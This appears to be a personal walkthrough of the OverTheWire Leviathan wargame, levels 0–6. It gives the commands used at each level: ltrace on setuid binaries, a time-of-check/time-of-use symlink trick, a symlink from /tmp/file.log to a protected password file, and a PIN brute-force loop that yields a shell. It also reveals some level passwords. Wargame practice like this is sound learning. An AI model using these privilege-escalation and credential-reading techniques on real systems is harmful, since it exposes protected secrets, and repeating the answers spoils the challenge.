### overthewire - leviathan (basic linux hacks)
leviathan levels are generally easy but one of them is pretty hard, leviathan2.

0. hidden files, string search
    * ```ls -a``` to reveal all files in home dir.
    * ```ls .backup```
    * ```vim .backup/bookmarks.html```
        * ```/``` to search (or space)
        * then type ```password```
            * stupidest tries first, works like a charm!
1. ltrace
    * ```ltrace check``` in home dir to trace execution of the setuid
    * found a ```strcmp``` of whatever i enterred against 'sex'
    * enter sex as password (some meme?)
    * ```cat /etc/leviathan_pass/leviathan2``` to get next level's password
    * don't do it in ltrace mode, priviledge won't escalate
2. TOCTOU
    * use ```ltrace``` to observe that this is an time-of-check/time-of-use attack
    * create a temporary directory
        * for some reason this path cannot be too long, so don't use ```mktemp -d```
    * create two files
        * ```echo x>x```
        * ```echo xy>"x y"```
    * link ```y``` to password
        * ```ln -s /etc/leviathan_pass/leviathan3 y```
    * time of check: ```access("x y")```
        * system thinks leviathan2 has the file ```x y``` 
    * time of use: ```sprintf("/bin/cat x y"...)```
        * ```cat``` treats space as delimeter
        * this is executed with leviathan3's priviledge
    * at last, call ```~/printfile "x y"```
        * password gets printed on second line
    * "call.me.by.your.name"
3. double escalation
    * use ```ltrace``` to find password for ```level3```
    * do it twice to become leviathan4
4. binary to char
    * i'm sure there are python or shell code for this thing
    * but i just used cyberchef
    * password's binary form in .trash/bin
5. read ltrace, linking
    * upon creating  ```/tmp/file.log```, ```ltrace ~/leviathan5``` prints out a suspicious line ```setuid(12005)```
        * looks like it's de-escalating the priviledge to leviathan5
        * must escalated priviledge before that
    * upon trying to write things in ```/tmp/file.log``` and then call ```~/leviathan5```, it spits out whatever i wrote there and deletes the file
    * combine these two pieces together, i linked ```/etc/leviathan_pass/leviathan6``` with ```/tmp/file.log``` and then have it spit the password out
    * ```ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log;~/leviathan5```
6. brute force
    * one can use python as well
    * shell script:
        * ```
            for i in {0000..9999}
            do
                echo $i
                ~/leviathan6 $i
            done ```
    * get shell around 7000
